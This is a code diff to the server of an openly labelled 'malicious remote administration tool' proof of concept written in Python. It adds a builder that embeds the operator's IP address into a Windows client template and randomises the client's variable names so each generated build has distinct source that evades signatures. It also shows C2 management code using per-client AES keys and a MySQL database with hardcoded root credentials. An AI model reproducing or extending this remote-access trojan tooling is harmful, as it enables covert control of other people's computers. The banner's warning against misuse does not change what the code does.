@@ -11,13 +11,66 @@ import subprocess
 import time
 import signal
 import os
+import random
+import uuid
 from time import gmtime, strftime
 from Crypto import Random
 from Crypto.Cipher import AES
+from urllib import urlopen
 
 BS = 16
 pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
 unpad = lambda s : s[:-ord(s[len(s)-1:])]
+
+def randomize_client():
+	f = open('bin/generic_client.py','r')
+	content = f.read()
+	content_text = str(content)
+	f.close
+	# a = int(001)
+	for a in range(1, 46):
+		ran = random.choice(string.ascii_letters) + uuid.uuid4().hex
+		if int(a) < 012:
+			var = str("var") + str("00") + str(a)
+			content_text = str(content_text).replace(var,ran)
+		else:
+			var = str("var") + str("0") + str(a)
+			content_text = str(content_text).replace(var,ran)
+	f = open('bin/generic_client.py','w')
+	f.write(str(content_text))
+	f.close()
+	print("[+] An unique source code have been build for a generic Windows client")
+	print(" ")
+
+def generate_client():
+	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	s.connect(('8.8.8.8', 1))
+	Local_ip = s.getsockname()[0]
+	s.close()
+	file = open("bin/template_client.py","r")
+	content = file.read()
+	content_text = str(content).replace("IP_SERVER_ADRESS",Local_ip)
+	f = open('bin/generic_client.py','w')
+	f.write(content_text)
+	f.close()
+	randomize_client()
+
+def banner():
+	print("    ____        __  __                   ____  ___  ______")
+	print("   / __ \__  __/ /_/ /_  ____  ____     / __ \/   |/_  __/")
+	print("  / /_/ / / / / __/ __ \/ __ \/ __ \   / /_/ / /| | / /   ")
+	print(" / ____/ /_/ / /_/ / / / /_/ / / / /  / _, _/ ___ |/ /    ")
+	print("/_/    \__, /\__/_/ /_/\____/_/ /_/  /_/ |_/_/  |_/_/     ")
+	print("      /____/                                              ")
+	print("						by HomardBoy ")
+	print("Proof of concept of a malicious remote administration tool")
+	print("DO NOT USE on a system that you do not own. ")
+	print("https://github.com/GuillaumeOrlando/Python_RAT")
+	print(" ")
+	print("[+] Looking for new clients ...")
+
+def start_server():
+	location = os.system("gnome-terminal -e 'python server.py'")
 
 def kill_server():
 	p = subprocess.Popen(['ps', '-ax'], stdout=subprocess.PIPE)
@@ -28,6 +81,7 @@ def kill_server():
 			os.kill(pid, signal.SIGKILL)
 			print("[+] C2 server stopped !")
 			print(" ")
+
 def get_key_from_mac(mac):
 	# Take the mac address of an host and retreive his AES key
 	db = MySQLdb.connect("localhost","root","toor","clients")
@@ -111,7 +165,7 @@ def calc_aes_key(iden):
 
 def check_alive():
 	alive = []
-	#Check if the hosts have been connected in the alst minute
+	#Check if the hosts have been connected in the last minute
 	#If not, marked them as 'down'
 	db = MySQLdb.connect("localhost","root","toor","clients")
         cursor = db.cursor()
@@ -235,7 +289,7 @@ def who_is_alive():
 		count_array += 1
 	nb_elems = count_array / 3
 	print(" ")
-	print("[+] There is " + str(nb_elems) + " connected clients : ")
+	print("[+] There is " + str(nb_elems) + " clients : ")
 
 	if nb_elems == 1:
 		for result in rows:
